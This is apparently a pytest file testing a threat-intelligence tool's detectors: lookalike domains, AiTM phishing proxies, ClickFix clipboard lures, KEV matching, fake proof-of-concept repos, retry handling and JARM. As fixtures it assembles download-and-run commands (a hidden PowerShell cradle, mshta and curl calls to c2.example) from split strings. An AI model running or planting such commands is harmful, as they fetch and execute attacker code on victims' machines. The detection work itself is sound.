"""Phase 2 detectors that had no tests: brand matcher, AiTM scoring, clipboard-lure detection, KEV-to-tech-tag
matching, fake-PoC heuristics, Retry-After handling, and JARM against a real (local) TLS server.

Lure fixtures are assembled at runtime (``J([...])``): a literal ClickFix lure in a source file is quarantined by
Windows Defender and other AV products, which would delete this test file on a developer machine.
"""

from __future__ import annotations

import asyncio
import base64
import ssl
from datetime import UTC, datetime, timedelta

import httpx
import idna
import pytest

from app.collectors import base
from app.collectors.edge_exploits import assess_poc_repo, match_kev_entry
from app.collectors.urlscan import detect_clipboard_lure
from app.processors import pivot
from app.processors.brand_matcher import BrandMatcher
from app.schemas.validators import normalize_jarm

J = "".join
CLIPBOARD_API = J(["navigator", ".clip", "board", ".write", "Text"])
COPY_COMMAND = J(["document.exec", "Command('copy')"])
CRADLE = J(["power", "shell -w h -c ", '"', "iw", "r https://c2.example/a.ps1 | i", "ex", '"'])
HTA = J(["msh", "ta https://c2.example/x.hta"])


# --- brand matcher (V1 lookalikes) ------------------------------------------------------------------------
@pytest.fixture(scope="module")
def brand() -> BrandMatcher:
    return BrandMatcher(["tencongty", "tcty-sso", "abc"], ["tencongty.vn", "tencongty.com.vn"])


@pytest.mark.parametrize(
    "domain,keyword,technique",
    [
        ("tencongty-login.example", "tencongty", "substring"),
        ("tencоngty-verify.example", "tencongty", "substring"),  # Cyrillic "o"
        ("tenc0ngty.example", "tencongty", "substring"),  # leet
        (idna.encode("têncôngty-sso.example").decode(), "tencongty", "substring"),  # IDN + diacritics
        ("tencong-ty.example", "tencongty", "substring"),  # hyphen inserted
        ("*.tencongty-portal.example", "tencongty", "substring"),  # wildcard SAN
        ("tencongtty.example", "tencongty", "edit-distance"),  # insertion
        ("tecnongty.example", "tencongty", "edit-distance"),  # adjacent swap
        ("tcty-sso.example", "tcty-sso", "substring"),
    ],
)
def test_brand_lookalikes_are_matched(brand, domain, keyword, technique):
    hit = brand.match(domain)
    assert hit is not None and (hit.keyword, hit.technique) == (keyword, technique)


@pytest.mark.parametrize("domain", ["sso.tencongty.vn", "tencongty.com.vn", "random.example", "abc-bank.example"])
def test_own_domains_unrelated_domains_and_short_keywords_do_not_match(brand, domain):
    assert brand.match(domain) is None  # "abc" is shorter than 4 characters and ignored


# --- AiTM scoring of a URLScan result ----------------------------------------------------------------------
def _scan(page: str, *urls: str) -> dict:
    return {"page": {"url": page}, "data": {"requests": [{"request": {"request": {"url": u}}} for u in urls]}}


def test_aitm_proxy_paths_and_microsoft_assets_score_a_candidate():
    result = _scan(
        "https://login-tencongty.example/",
        "https://login-tencongty.example/common/oauth2/v2.0/authorize?client_id=x",
        "https://login-tencongty.example/common/GetCredentialType?mkt=en",
        "https://aadcdn.msftauth.net/shared/1.0/content/js/x.js",
        "https://login.microsoftonline.com/common/login",  # a Microsoft host: not a proxied path
    )
    a = pivot.assess_aitm(result)
    assert a.proxied_identity_paths == ["/common/getcredentialtype", "/common/oauth2/v2.0/authorize"]
    assert a.loads_microsoft_identity_assets and a.score == 75 and a.is_aitm_candidate
    jarm = "2ad2ad16d2ad2ad00042d42d00042ddb04deffa1705e2edc44cae1ed24a4da"
    assert pivot.assess_aitm(result, jarm=jarm, bad_jarms=frozenset({jarm})).score == 90  # corroborating only


def test_aitm_needs_proxied_paths_and_never_scores_microsoft_itself():
    assets_only = _scan("https://shop.example/", "https://aadcdn.msftauth.net/x.js")
    assert pivot.assess_aitm(assets_only).score == 15 and not pivot.assess_aitm(assets_only).is_aitm_candidate
    real = _scan("https://login.microsoftonline.com/", "https://login.microsoftonline.com/common/oauth2/authorize")
    assert pivot.assess_aitm(real).score == 0
    many = _scan("https://p.example/", *(f"https://p.example{m}" for m in pivot.AITM_PATH_MARKERS),
                 "https://aadcdn.msauth.net/x.js")  # fmt: skip
    assert pivot.assess_aitm(many, jarm="j", bad_jarms=frozenset({"j"})).score == 100  # capped


# --- ClickFix clipboard lures (V3) ---------------------------------------------------------------------------
def test_clipboard_lure_with_a_lolbin_command_is_detected():
    lure = detect_clipboard_lure(f"<script>{CLIPBOARD_API}('{CRADLE}')</script>")
    assert lure is not None and lure.payloads == (CRADLE,)


def test_encoded_clipboard_payload_is_found_through_the_unpacker():
    encoded = base64.b64encode(HTA.encode()).decode()
    assert detect_clipboard_lure(f"<script>{CLIPBOARD_API}(atob('{encoded}'))</script>") is not None


def test_textarea_and_exec_command_copy_variant():
    lure = detect_clipboard_lure(
        f"<textarea id=t>cmd /c curl -o a.exe https://c2.example/a</textarea><script>{COPY_COMMAND}</script>"
    )  # noqa: E501
    assert lure is not None and lure.payloads == ("cmd /c curl -o a.exe https://c2.example/a",)


@pytest.mark.parametrize(
    "html",
    [
        f"<p>'{CRADLE}'</p>",  # a command but no clipboard API
        f"<script>{CLIPBOARD_API}('Your verification code is 123456789')</script>",  # clipboard API, no LOLBin
    ],
)
def test_no_lure_without_both_clipboard_write_and_lolbin(html):
    assert detect_clipboard_lure(html) is None


# --- KEV entry -> tenant tech tags (V2) ------------------------------------------------------------------------
TAGS = {"fortinet:fortios", "fortinet:fortigate", "microsoft:exchange_server", "microsoft:windows_server",
        "microsoft:iis", "vmware:vcenter_server", "nginx:nginx"}  # fmt: skip


@pytest.mark.parametrize(
    "vendor,product,expected",
    [
        ("Fortinet", "FortiOS", ["fortinet:fortios"]),
        ("Fortinet", "FortiOS and FortiProxy", ["fortinet:fortios"]),
        ("Microsoft", "Windows", ["microsoft:windows_server"]),
        ("Microsoft", "Internet Information Services (IIS)", ["microsoft:iis"]),
        ("VMware", "vCenter Server", ["vmware:vcenter_server"]),
        ("VMware", "ESXi", []),
        ("Ivanti", "Connect Secure", []),  # vendor not in the stack
    ],
)
def test_kev_entries_match_the_tenant_tags_they_affect(vendor, product, expected):
    assert match_kev_entry({"vendorProject": vendor, "product": product}, TAGS) == expected


@pytest.mark.parametrize(
    "product,expected",
    [
        ("Exchange Server", ["microsoft:exchange_server"]),  # was also matching windows_server (fixed 2026-11-05)
        ("SharePoint Server", []),  # was matching exchange_server and windows_server
        ("ExchangeServer", ["microsoft:exchange_server"]),  # glued product name still matches
        ("Windows Server", ["microsoft:windows_server"]),
    ],
)
def test_generic_product_tokens_do_not_cause_matches(product, expected):
    assert match_kev_entry({"vendorProject": "Microsoft", "product": product}, TAGS) == expected


def test_a_tag_made_only_of_generic_words_never_matches():
    assert match_kev_entry({"vendorProject": "Acme", "product": "Acme Server"}, {"acme:server"}) == []


# --- fake PoC repositories (V6 lure aimed at defenders) ---------------------------------------------------------------
def _repo(owner_age_days: int) -> dict:
    created = datetime(2026, 10, 30, tzinfo=UTC)
    return {"full_name": "someone/CVE-2026-1111-poc", "html_url": "https://github.example/someone/poc",
            "created_at": created.isoformat().replace("+00:00", "Z"),
            "owner": {"created_at": (created - timedelta(days=owner_age_days)).isoformat().replace("+00:00", "Z")}}  # fmt: skip


def test_fake_poc_signals_add_up():
    a = assess_poc_repo(_repo(2), ["README.md", "poc.zip"], "Download and run. Password: infected")
    assert a.likely_fake and a.suspicion == 95 and a.exploit_files == []
    assert any("binaries" in r for r in a.reasons) and any("password" in r for r in a.reasons)
    obfuscated = assess_poc_repo(
        _repo(400), ["exploit.py"], "run: exec(base64.b64decode(x)) after pip install req-tools"
    )
    assert obfuscated.suspicion == 40 and not obfuscated.likely_fake  # eval + extra package, but readable source


def test_plain_poc_is_not_flagged_and_its_sources_are_listed():
    a = assess_poc_repo(_repo(2000), ["README.md", "exploit.py", "templates/check.yaml", "img/logo.png"],
                        "Usage: python exploit.py https://target.example")  # fmt: skip
    assert a.suspicion == 0 and not a.likely_fake and a.exploit_files == ["exploit.py", "templates/check.yaml"]


# --- polite HTTP: Retry-After -------------------------------------------------------------------------------------------
@pytest.fixture
def sleeps(monkeypatch) -> list[float]:
    seen: list[float] = []

    async def fake_sleep(seconds: float) -> None:
        seen.append(seconds)

    monkeypatch.setattr(base.asyncio, "sleep", fake_sleep)
    return seen


def _flaky(*first: httpx.Response):
    queue = list(first)

    def handler(request: httpx.Request) -> httpx.Response:
        return queue.pop(0) if queue else httpx.Response(200, json={"ok": True})

    return httpx.AsyncClient(transport=httpx.MockTransport(handler))


async def test_retry_after_seconds_are_honoured_and_capped(sleeps):
    async with _flaky(httpx.Response(429, headers={"Retry-After": "7"}), httpx.Response(503)) as client:
        assert await base.get_json(client, "https://api.example/x") == {"ok": True}
    assert sleeps == [7.0, 4.0]  # Retry-After, then exponential back-off for the 503
    async with _flaky(httpx.Response(429, headers={"Retry-After": "999"})) as client:
        await base.get_json(client, "https://api.example/x")
    assert sleeps[-1] == 120  # never sleeps longer than 2 minutes


async def test_retries_are_bounded_and_client_errors_are_not_retried(sleeps):
    async with _flaky(*[httpx.Response(500)] * 4) as client:
        with pytest.raises(httpx.HTTPStatusError):
            await base.get_json(client, "https://api.example/x")
    assert len(sleeps) == 3
    async with _flaky(httpx.Response(404)) as client:
        with pytest.raises(httpx.HTTPStatusError):
            await base.get_json(client, "https://api.example/x")
    assert len(sleeps) == 3  # no extra wait


async def test_retry_after_http_date_is_accepted(sleeps):
    """RFC 9110 allows an HTTP-date; it used to raise ValueError and abort the whole sweep (fixed 2026-11-05)."""
    from email.utils import format_datetime

    past = "Wed, 21 Oct 2026 07:28:00 GMT"
    soon = format_datetime(datetime.now(UTC) + timedelta(seconds=30), usegmt=True)
    later = format_datetime(datetime.now(UTC) + timedelta(hours=2), usegmt=True)
    for header in (past, soon, later, "soon-ish"):
        async with _flaky(httpx.Response(429, headers={"Retry-After": header})) as client:
            assert await base.get_json(client, "https://api.example/x") == {"ok": True}
    assert sleeps[0] == 0.0  # a date in the past: retry now
    assert 25 <= sleeps[1] <= 30  # a date 30 s ahead
    assert sleeps[2] == base.MAX_RETRY_AFTER_SECONDS  # capped
    assert sleeps[3] == 2.0  # unreadable: normal back-off


def test_retry_after_parser():
    now = datetime(2026, 11, 5, tzinfo=UTC)
    assert base.retry_after_seconds("12", 2.0, now=now) == 12.0
    assert base.retry_after_seconds("-5", 2.0, now=now) == 0.0
    assert base.retry_after_seconds("Thu, 05 Nov 2026 00:01:00 GMT", 2.0, now=now) == 60.0
    assert base.retry_after_seconds(None, 2.0, now=now) == base.retry_after_seconds("  ", 2.0, now=now) == 2.0


# --- JARM against a real TLS server ---------------------------------------------------------------------------------------
def _self_signed(tmp_path) -> ssl.SSLContext:
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.x509.oid import NameOID

    key = ec.generate_private_key(ec.SECP256R1())
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "tls.example")])
    now = datetime.now(UTC)
    cert = (x509.CertificateBuilder().subject_name(name).issuer_name(name).public_key(key.public_key())
            .serial_number(x509.random_serial_number()).not_valid_before(now - timedelta(days=1))
            .not_valid_after(now + timedelta(days=1)).sign(key, hashes.SHA256()))  # fmt: skip
    cert_file, key_file = tmp_path / "cert.pem", tmp_path / "key.pem"
    cert_file.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
    key_file.write_bytes(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
                                           serialization.NoEncryption()))  # fmt: skip
    ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ctx.load_cert_chain(cert_file, key_file)
    return ctx


async def test_pinned_jarm_fingerprints_a_real_tls_server(tmp_path):
    """The guard refuses 127.0.0.1 on purpose, so this drives the pinned scanner directly: the hellos carry the
    hostname and the connection goes to the given IP, as after a successful resolve_public()."""

    async def serve(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        try:
            await reader.read(1)
        except (ssl.SSLError, ConnectionError):
            pass
        finally:
            writer.close()

    server = await asyncio.start_server(serve, "127.0.0.1", 0, ssl=_self_signed(tmp_path))
    port = server.sockets[0].getsockname()[1]
    async with server:
        value = await pivot._pinned_jarm("tls.example", "127.0.0.1", port, 5)
    assert normalize_jarm(value) == value and len(value) == 62  # not all zeros: the server answered
